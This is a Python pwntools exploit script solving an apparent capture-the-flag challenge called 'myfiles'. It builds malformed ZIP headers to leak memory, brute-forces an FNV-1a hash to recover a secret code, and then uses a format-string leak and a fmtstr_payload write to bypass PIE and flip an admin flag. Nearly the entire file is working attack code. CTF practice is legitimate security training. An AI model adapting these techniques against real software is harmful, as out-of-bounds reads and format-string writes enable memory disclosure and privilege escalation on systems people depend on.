#!/bin/python3
from pwn import *
import os
import zipfile
import io

context.log_level = 'INFO'
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['terminator', '-u', '-e']
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './chal'
elf = context.binary = ELF(process_name)
#libc = ELF('./libc.so.6')

HOST = "myfiles.chal.irisc.tf"
PORT = 10001

######################################################################################

# breakrva [-h] [offset] [module]
# aslr [-h] [{off,on}]
gdb_script = f'''
    #set breakpoint pending on
    #b createUser
    #breakrva 0x182d
    #b viewFlag
    breakrva 0x183d
    #b readZipInfo
    #b askUserAndPass
    #b hash
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

def create(code, name, passwd):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'?', code)
    p.sendlineafter(b'?', name)
    p.sendlineafter(b'?', passwd)

def crear_zip_y_devolver_hex(cadena, nombre_archivo_zip="archivo.zip", nombre_archivo_txt="contenido.txt"):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, mode="w", compression=zipfile.ZIP_STORED) as zipf:
        zipf.writestr(nombre_archivo_txt, cadena)
    
    zip_bytes = zip_buffer.getvalue()
    hex_result = zip_bytes.hex()
    return hex_result

def uploadFile(id, cnt):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'?', str(id).encode())
    p.sendline(cnt)

def view(id, passwd, i):
    p.sendlineafter(b'>', b'5')
    p.sendlineafter(b'?', str(id).encode())
    p.sendlineafter(b'?', passwd.encode())
    p.sendlineafter(b'?', str(i).encode())

def getFlag(id, passwd):
    p.sendlineafter(b'>', b'6')
    p.sendlineafter(b'?', str(id).encode())
    p.sendlineafter(b'?', passwd.encode())

def createFile(name_size, name, cont):
    file  = p32(0x4034b50)
    file += b'\x00' * (0x12 - len(file))
    file += p32(len(cont))
    file += b'\x00' * (0x1a - len(file))
    file += p32(name_size)
    file += name
    file += cont
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'?', str(15).encode())
    p.sendline(file.hex().encode())

def fnv1a_hash(data: bytes) -> int:
    hash_value = 0xcbf29ce484222325
    fnv_prime = 0x100000001b3

    for byte in data:
        hash_value ^= byte
        hash_value *= fnv_prime
        hash_value &= 0xFFFFFFFFFFFFFFFF
    return hex(hash_value)[2:]

def readHash(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'?', str(15).encode())
    p.recvuntil(f'FID={idx}'.encode())
    return p.recvline().strip().split(b' ')[-1]

def bruteBye(base, target):
    for i in range(0x100):
        payload = base + p8(i)
        #print(payload, hex(fnv1a_hash(payload)), target)
        if fnv1a_hash(payload) == target.decode():
            return p8(i)

######################################################################################

p = connect()

base_off = 0xfffffe0a
base_secret = b'ecode.txt'
size = 10   

for i in range(20):
    createFile(base_off - size + 1 + i - (0x204 * i), b'nombre.txt', b'A' * size)
    target = readHash(i+1)
    print("[i] TARGET:", target)
    base_secret += bruteBye(base_secret[-9:], target)
    print(base_secret)

code = base_secret[9:].decode()
print("[i] CODE:", code)

for i in range(2):
#    create(b'terrible-red-busses', b'Chals-' + str(i).encode(), b'12345')
    create(code.encode(), b'Chals-' + str(i).encode(), b'12345')

hexCnt = crear_zip_y_devolver_hex(b'||||%p|' + b'X' * 0x100)
uploadFile(0, hexCnt.encode())

view(0, '12345', 0)

#p.interactive()

p.recvuntil(b'||||')
elf.address = int(p.recvuntil(b'|')[:-1], 16) - (0x555555559087 - 0x555555554000) - 0xa0
print("[i] .text:", hex(elf.address))

buffer = elf.address + (0x555555559050 - 0x555555554000)
print("[i] Admin Buff:", hex(buffer))

write  = {
    buffer : 1
}

payload = fmtstr_payload(14, write, write_size='short')
hexCnt = crear_zip_y_devolver_hex(payload + b'X' * 0x100)
uploadFile(0, hexCnt.encode())

view(0, '12345', 1)

getFlag(0, '12345')

######################################################################################

p.interactive()

